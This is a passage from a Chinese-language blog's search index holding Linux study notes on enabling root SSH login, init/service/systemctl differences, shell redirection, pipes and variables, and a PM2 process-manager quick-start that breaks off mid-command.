登入"></a>在Ubuntu中如何远程 root 登入</h4><p>在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># PermitRootLogin prohibit-password</span><br><span class="line"># 修改为：</span><br><span class="line"># PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"># 重启sshd 服务</span><br><span class="line">$ sudo systemctl restart sshd</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/li_101357/article/details/46778827" target="_blank" rel="noopener">adduser 和 useradd 的区别</a></li><li><a href="https://www.cnblogs.com/noway-neway/p/5235300.html" target="_blank" rel="noopener">Ubuntu 如何进入单用户模式</a></li><li><a href="https://raspberrypi.stackexchange.com/questions/48056/how-to-login-as-root-remotely" target="_blank" rel="noopener">ssh-如何远程以root 登入</a></li><li><a href="https://www.cyberciti.biz/faq/change-root-password-ubuntu-linux/" target="_blank" rel="noopener">如何在Ubuntu Linux 中更改 root 密码</a></li><li><a href="https://www.cyberciti.biz/faq/become-superuser-on-ubuntu-linux/" target="_blank" rel="noopener">如何使用su / sudo成为Ubuntu Linux的超级用户？</a></li><li><a href="https://www.cyberciti.biz/faq/ubuntu-linux-root-password-default-password/" target="_blank" rel="noopener">Ubuntu Linux root 用户默认密码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux init、service、systemctl 三者区别</title>
      <link href="/the-difference-between-linux-init-service-systemctl/"/>
      <url>/the-difference-between-linux-init-service-systemctl/</url>
      
        <content type="html"><![CDATA[<p>在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是<code>init</code>、<code>service</code>、<code>systemctl</code>。</p><p>至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。</p><a id="more"></a><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>历史上，Linux 的启动一直采用init 进程。</p><p>在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。</p><p>Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。</p><p>因为init 的参数全在<code>/etc/init.d</code>目录下，所以使用 init 启动一个服务，应该这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br></pre></td></tr></table></figure><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>通过查看man 手册页可以得知，service是一个运行<code>System V init</code>的脚本命令。</p><blockquote><p>那么什么是 System V init 呢？</p></blockquote><p>也就是<code>/etc/init.d</code> 目录下的参数。</p><p>所以分析可知service 是去<code>/etc/init.d</code>目录下执行相关程序，服务配置文件的存放目录就是<code>/etc/init.d</code>.</p><p>使用 service 启动一个服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>可以理解成 service 就是<code>init.d</code> 的一种实现方式。<br>所以这两者启动方式（或者是停止、重启）并没有什么区别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br><span class="line">&#x2F;&#x2F; 等价于</span><br><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>但是这两种方式均有如下缺点：</p><ol><li>启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</li><li>启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</li></ol><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>Systemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。<br>Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 <code>System V init</code>固有的缺点，提高系统的启动速度。</p><p>根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。</p><p>使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。</p><p>查看Systemd 的版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl --version</span><br></pre></td></tr></table></figure><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p><strong>Systemd 并不是一个命令，而是一组命令</strong>，涉及到系统管理的方方面面。</p><h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><p>systemctl是 Systemd 的主命令，用于管理系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动进入救援状态（单用户状态）</span><br><span class="line">$ sudo systemctl rescue</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 管理服务</span><br><span class="line">$ sudo systemctl start nginx</span><br></pre></td></tr></table></figure><h4 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h4><p>hostnamectl命令用于查看当前主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 显示当前主机信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname BoodeUbuntu</span><br></pre></td></tr></table></figure><h4 id="localectl"><a href="#localectl" class="headerlink" title="localectl"></a>localectl</h4><p>localectl命令用于查看本地化设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看本地化设置</span><br><span class="line">$ localectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置本地化参数。</span><br><span class="line">$ sudo localectl set-locale LANG&#x3D;en_GB.utf8</span><br><span class="line">$ sudo localectl set-keymap en_GB</span><br></pre></td></tr></table></figure><h4 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h4><p>timedatectl命令用于查看当前时区设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看当前时区设置</span><br><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 显示所有可用的时区</span><br><span class="line">$ timedatectl list-timezones                                                                                   </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置当前时区</span><br><span class="line">$ sudo timedatectl set-timezone America&#x2F;New_York</span><br><span class="line">$ sudo timedatectl set-time YYYY-MM-DD</span><br><span class="line">$ sudo timedatectl set-time HH:MM:SS</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>init</code> 是最初的进程管理方式</li><li><code>service</code> 是<code>init</code> 的另一种实现</li><li><code>systemd</code> 则是一种取代 <code>initd</code> 的解决方案</li></ul><p>其中 <code>systemctl</code> 是 <code>systemd</code> 的主命令，用于管理系统以及服务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener">Linux Init - 维基百科</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程 - 阮一峰的网络日志</a></li><li><a href="https://blog.csdn.net/lineuman/article/details/52578399" target="_blank" rel="noopener">init、service、systemctl 的区别</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html" target="_blank" rel="noopener">Linux 守护进程的启动方式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解 Linux的管道符、重定向、环境变量</title>
      <link href="/understand-linux-pipe-symbols-redirects-environment-variables/"/>
      <url>/understand-linux-pipe-symbols-redirects-environment-variables/</url>
      
        <content type="html"><![CDATA[<p>这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。</p><a id="more"></a><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><p>在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别：</p><ul><li>标准输出信息：<br>包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。</li><li>错误输出信息：<br>Bash终端显示的报错提示信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls</span><br><span class="line">testdir   test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!                        # 标准输出信息</span><br><span class="line">[max@localhost 桌面]$ cat xxx</span><br><span class="line">cat: xxx: 没有那个文件或目录        # 错误输出信息 因为不存在xxx文件</span><br></pre></td></tr></table></figure></li><li>标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。</li><li>标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。</li><li>错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。</li></ul><p>之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令 &gt; 文件        将标准输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 2&gt; 文件    将错误输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 &gt;&gt; 文件    将标准输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 2&gt;&gt; 文件   将错误输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 &gt;&gt; 文件 2&gt;&amp;1 或</span><br><span class="line">命令 &amp;&gt;&gt; 文件将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!</span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt </span><br><span class="line">Hello Linux!</span><br><span class="line">测试输出重定向(追加模式)</span><br><span class="line"></span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">测试输出重定向(清除模式)</span><br></pre></td></tr></table></figure><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件将文件作为命令的标准输入</span><br><span class="line">命令 &lt;&lt; 分界符从标准输入中读入，直到遇见分界符才停止</span><br><span class="line">命令 &lt; 文件1 &gt; 文件2将文件1作为命令的标准输入并将标准输出到文件2</span><br></pre></td></tr></table></figure><p>输入重定向相对于输出重定向较使用的少一些，可以理解为：<strong>输入重定向的作用是把文件直接导入到命令中</strong>。<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。</span><br><span class="line">[max@localhost 桌面]$ wc -l &lt; test.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。</p><p>举个例子，把<code>etc</code>目录下的所有文件的属性信息，作为标准输入传递给 <code>more</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more</span><br><span class="line">总用量 1396</span><br><span class="line">drwxr-xr-x.  3 root root       97 8月  24 04:35 abrt</span><br><span class="line">-rw-r--r--.  1 root root       16 8月  24 04:43 adjtime</span><br><span class="line">-rw-r--r--.  1 root root    21929 1月  29 2014 brltty.conf</span><br><span class="line">drwxr-xr-x.  2 root root        6 1月  29 2014 chkconfig.d</span><br><span class="line">-rw-r--r--.  1 root root     1157 2月   6 2014 chrony.conf</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure><h3 id="命令行中的通配符"><a href="#命令行中的通配符" class="headerlink" title="命令行中的通配符"></a>命令行中的通配符</h3><ul><li>星号（*）代表匹配零个或多个字符</li><li>问号（?）代表匹配单个字符</li><li>中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符</li><li>而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ ls</span><br><span class="line">file1  file2  file3  file99  filex</span><br><span class="line">[max@localhost test]$ ls -l file?</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file*</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file99</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file[1-2]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">[max@localhost test]$ ls -l file[x]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br></pre></td></tr></table></figure><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><blockquote><p>反斜杠（\）：使反斜杠后面的一个变量变为单纯的字符串。</p><p>单引号（’’）：转义其中所有的变量为单纯的字符串。</p><p>双引号（””）：保留其中的变量属性，不进行转义处理。</p><p>反引号（``）：把其中的命令执行后返回结果。</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ PRICE&#x3D;5</span><br><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;</span><br><span class="line">The price of this shirt is 5</span><br></pre></td></tr></table></figure><p>上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;</span><br><span class="line">The price of this shirt is 9944PRICE</span><br></pre></td></tr></table></figure><p>不幸的是美元符号和变量提取符号合并后<code>$$</code>作用是显示当前程序的进程ID。</p><p>要想让第一个<code>$</code>乖乖地作为美元符号，那么就需要使用反斜杠<code>\</code>来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is \$$PRICE&quot;</span><br><span class="line">The price of this shirt is $5</span><br></pre></td></tr></table></figure><p>如果只需要某个命令的输出值时，可以像<code>命令</code>这样，将命令用反引号括起来，达到预期的效果.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1</span><br><span class="line">[max@localhost test]$ cat file1</span><br><span class="line">Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><blockquote><p>思考：如何将普通变量转换为全局变量？</p></blockquote><p>使用命令：<code>export [变量名称]</code>，需要在拥有管理员权限时才能正常使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost home]# mkdir $WORKDIR </span><br><span class="line">[root@localhost home]# cd $WORKDIR</span><br><span class="line">[root@localhost workdir]# pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost workdir]# exit</span><br><span class="line">exit</span><br><span class="line">[max@localhost home]$ cd $WORKDIR</span><br><span class="line">[max@localhost ~]$ echo $WORKDIR</span><br><span class="line">[max@localhost ~]$ su root</span><br><span class="line">密码：</span><br><span class="line">[root@localhost max]# export WORKDIR</span><br><span class="line">[root@localhost &#x2F;]# su max</span><br><span class="line">[max@localhost &#x2F;]$ cd $WORKDIR</span><br><span class="line">[max@localhost workdir]$ pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br></pre></td></tr></table></figure><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>在上面的命令中有一个很重要的知识点：</p><blockquote><p>关于如何在Linux中创建一个变量的问题？有两个地方需要注意。</p></blockquote><ol><li>所有字母都需要大写</li><li>变量与赋值符号(=)之间不能存在空格</li><li>无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用<code>$</code>符号来标识。</li></ol><h4 id="重点二"><a href="#重点二" class="headerlink" title="重点二"></a>重点二</h4><ul><li>在Linux 系统中当普通用户身份时命令提示符的前缀标识是：<code>$</code>。</li><li>在Linux 系统中当为管理员身份时命令提示符的前缀标识是：<code>#</code>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PM2 快速上手</title>
      <link href="/pm2-quick-start/"/>
      <url>/pm2-quick-start/</url>
      
        <content type="html"><![CDATA[<p><a href="http://pm2.keymetrics.io/" target="_blank" rel="noopener">PM2</a> 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。</p><a id="more"></a><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install pm2 -g</span><br></pre></td></tr></table></figure><p>无缝更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 update</span><br></pre></td></tr></table></figure><h2 id="启动应用"><a href="#启动应用" class="headerlink" title="启动应用"></a>启动应用</h2><p>PM2 中有两种方式启动应用，一种是<strong>直接调用应用入口文件</strong>，一种是<strong>通过调用配置文件启动应用</strong>。</p><h3 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h3><p>在生产环境中，通过命令行启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stat app.js</span><br></pre></td></tr></table></figure><h3 id="配置文件启动"><a href="#配置文件启动" class="headerlink" title="配置文件启动"></a>配置文件启动</h3><p>很多时候，仅仅只是使用 <code>PM2</code> 去启动应用，可能不能完全满足我们的需求。</p><p>当需要对应用有更多的要求时，这个时候就需要用到<code>PM2</code> 的配置文件了。</p><p>PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件<code>precesses.json</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;apps&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;myApp&quot;,</span><br><span class="line">      &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;,</span><br><span class="line">      &quot;script&quot;: &quot;.&#x2F;app.js&quot;,</span><br><span class="line">      &quot;watch&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接使用 <code>pm2 init</code> 命令，自动创建默认的<code>ecosystem.config.js</code>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  apps : [&#123;</span><br><span class="line">    name: &quot;myApp&quot;,</span><br><span class="line">    script: &#39;index.js&#39;,</span><br><span class="line">    watch: &#39;.&#39;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是<code>json</code>格式的配置文件，一个是<code>js</code>格式的配置文件。</p><p>上面是一个最简单的<code>processes.json</code>配置，创建了一个<code>myApp</code>应用，如果你有多个服务，那么<code>apps</code> 这个数组中创建多个应用。</p><blockquote><p>创建好配置文件之后，那么该如何启动呢？</p></blockquote><p>有两种方式：</p><ol><li>直接调用配置文件启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 start processes.json</span><br></pre></td></tr></table></figure><p>可以增加<code>--env</code>参数，来指定当前启动环境。</p><ol start="2"><li>通过<code>package.json</code> 配置文件，配置脚本启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; package.json</span><br><span class="line"></span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">    &quot;pm2&quot;: &quot;pm2 start processes.json&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后就可以直接使用<code>npm start pm2</code> 来启动应用了。</p><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。</p><p>PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。</p><table><thead><tr><th>字段</th><th>类型</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>string</td><td>myApp</td><td>应用的名字，默认是脚本文件名</td></tr><tr><td>cwd</td><td>string</td><td>/var/www/myApp</td><td>应用程序所在目录</td></tr><tr><td>script</td><td>string</td><td>./server.js</td><td>应用程序的脚本路径，相对于应用程序所在目录</td></tr><tr><td>log_date_format</td><td>string</td><td>YYYY-MM-DD HH:mm Z</td><td>日志时间格式</td></tr><tr><td>error_file</td><td>string</td><td>-</td><td>错误日志存放路径</td></tr><tr><td>out_file</td><td>string</td><td>-</td><td>输出日志存放路径</td></tr><tr><td>pid_file</td><td>string</td><td>-</td><td>pid文件路径</td></tr><tr><td>watch</td><td>boolean or array</td><td>true</td><td>当目录文件或子目录文件有变化时自动重新加载应用</td></tr><tr><td>ignore_watch</td><td>list</td><td>[”[/]./”, “node_modules”]</td><td>list中的正则匹配的文件和目录有变化时不重新加载应用</td></tr><tr><td>max_memory_restart</td><td>string</td><td>50M</td><td>当应用超过设定的内存大小就自动重启</td></tr><tr><td>min_uptime</td><td>string</td><td>60s</td><td>最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量</td></tr><tr><td>max_restarts</td><td>number</td><td>10</td><td>设置应用程序异常退出重启的次数，默认15次（从0开始计数）</td></tr><tr><td>instances</td><td>number</td><td>1</td><td>启动实例个数</td></tr><tr><td>cron_restart</td><td>string</td><td>1 0 * * *</td><td>定时重启</td></tr><tr><td>exec_interpreter</td><td>string</td><td>node</td><td>应用程序的脚本类型，默认是node</td></tr><tr><td>exec_mode</td><td>string</td><td>fork</td><td>应用启动模式，支持fork和cluster模式，默认为fork</td></tr><tr><td>autorestart</td><td>boolean</td><td>true</td><td>应用程序崩溃或退出时自动重启</td></tr></tbody></table><p>有以下几点需要注意 ⚠️：</p><ol><li>如果<code>processes.json</code>或者<code>ecosystem.config.js</code> 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。</li><li><code>cwd</code> 不要填绝对路径，建议用相对路径，<code>./</code>表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。</li></ol><h3 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h3><p>列出所有节点应用程序（进程/微服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 list</span><br><span class="line">$ pm2 ls</span><br></pre></td></tr></table></figure><p>可以将进程列表以JSON格式打印出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 jlist</span><br><span class="line">$ pm2 prettylist</span><br></pre></td></tr></table></figure><p>使用进程ID或名称查看所示的单个Node进程的详细信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 describe &lt;id | app_name&gt;</span><br><span class="line">$ pm2 show &lt;id | 